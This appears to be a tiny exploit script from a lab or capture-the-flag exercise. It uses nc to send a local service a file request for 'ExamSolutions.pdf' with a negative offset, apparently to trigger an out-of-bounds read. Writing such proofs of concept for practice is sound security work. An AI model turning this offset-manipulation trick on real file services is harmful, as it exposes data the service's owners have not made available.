#!/usr/bin/env bash
echo -n '{"command":"GET", "name":"ExamSolutions.pdf", "length": 89, "offset": -90}' | nc localhost 4040
